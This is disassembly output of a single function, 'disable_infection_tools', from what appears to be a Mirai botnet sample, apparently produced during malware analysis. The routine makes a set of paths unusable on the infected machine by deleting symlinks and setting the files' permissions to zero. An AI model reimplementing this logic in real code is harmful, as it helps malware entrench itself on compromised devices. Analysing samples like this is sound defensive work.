
/Users/taogoldi/Projects/malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

0000000000400a10 <disable_infection_tools>:
  400a10: 41 55                        	push	r13
  400a12: 41 54                        	push	r12
  400a14: 55                           	push	rbp
  400a15: 31 ed                        	xor	ebp, ebp
  400a17: 53                           	push	rbx
  400a18: 48 81 ec d8 00 00 00         	sub	rsp, 0xd8
  400a1f: 4c 8d ac 24 90 00 00 00      	lea	r13, [rsp + 0x90]
  400a27: 48 c7 84 24 90 00 00 00 48 4b 41 00  	mov	qword ptr [rsp + 0x90], 0x414b48
  400a33: 48 c7 84 24 98 00 00 00 56 4b 41 00  	mov	qword ptr [rsp + 0x98], 0x414b56
  400a3f: 48 c7 84 24 a0 00 00 00 64 4b 41 00  	mov	qword ptr [rsp + 0xa0], 0x414b64
  400a4b: 48 c7 84 24 a8 00 00 00 72 4b 41 00  	mov	qword ptr [rsp + 0xa8], 0x414b72
  400a57: 48 c7 84 24 b0 00 00 00 7f 4b 41 00  	mov	qword ptr [rsp + 0xb0], 0x414b7f
  400a63: 48 c7 84 24 b8 00 00 00 8c 4b 41 00  	mov	qword ptr [rsp + 0xb8], 0x414b8c
  400a6f: 48 c7 84 24 c0 00 00 00 98 4b 41 00  	mov	qword ptr [rsp + 0xc0], 0x414b98
  400a7b: 48 c7 84 24 c8 00 00 00 a8 4b 41 00  	mov	qword ptr [rsp + 0xc8], 0x414ba8
  400a87: eb 1a                        	jmp	0x400aa3 <disable_infection_tools+0x93>
  400a89: 66 66 66 90                  	nop
  400a8d: 66 66 90                     	nop
  400a90: 31 f6                        	xor	esi, esi
  400a92: 48 89 df                     	mov	rdi, rbx
  400a95: e8 66 65 00 00               	call	0x407000 <chmod>
  400a9a: 48 ff c5                     	inc	rbp
  400a9d: 48 83 fd 08                  	cmp	rbp, 0x8
  400aa1: 74 35                        	je	0x400ad8 <disable_infection_tools+0xc8>
  400aa3: 49 8b 5c ed 00               	mov	rbx, qword ptr [r13 + 8*rbp]
  400aa8: 48 89 e6                     	mov	rsi, rsp
  400aab: 48 89 df                     	mov	rdi, rbx
  400aae: e8 01 68 00 00               	call	0x4072b4 <lstat64>
  400ab3: 85 c0                        	test	eax, eax
  400ab5: 75 e3                        	jne	0x400a9a <disable_infection_tools+0x8a>
  400ab7: 8b 44 24 18                  	mov	eax, dword ptr [rsp + 0x18]
  400abb: 25 00 f0 00 00               	and	eax, 0xf000
  400ac0: 3d 00 a0 00 00               	cmp	eax, 0xa000
  400ac5: 75 c9                        	jne	0x400a90 <disable_infection_tools+0x80>
  400ac7: 48 89 df                     	mov	rdi, rbx
  400aca: 48 ff c5                     	inc	rbp
  400acd: e8 4e 6e 00 00               	call	0x407920 <unlink>
  400ad2: 48 83 fd 08                  	cmp	rbp, 0x8
  400ad6: 75 cb                        	jne	0x400aa3 <disable_infection_tools+0x93>
  400ad8: 31 f6                        	xor	esi, esi
  400ada: bf b6 4b 41 00               	mov	edi, 0x414bb6
  400adf: e8 c8 64 00 00               	call	0x406fac <access>
  400ae4: 85 c0                        	test	eax, eax
  400ae6: 75 0c                        	jne	0x400af4 <disable_infection_tools+0xe4>
  400ae8: 31 f6                        	xor	esi, esi
  400aea: bf b6 4b 41 00               	mov	edi, 0x414bb6
  400aef: e8 0c 65 00 00               	call	0x407000 <chmod>
  400af4: 48 81 c4 d8 00 00 00         	add	rsp, 0xd8
  400afb: 5b                           	pop	rbx
  400afc: 5d                           	pop	rbp
  400afd: 41 5c                        	pop	r12
  400aff: 41 5d                        	pop	r13
  400b01: c3                           	ret
  400b02: 66 66 66 90                  	nop
  400b06: 66 66 66 90                  	nop
  400b0a: 66 66 90                     	nop
  400b0d: 66 66 90                     	nop
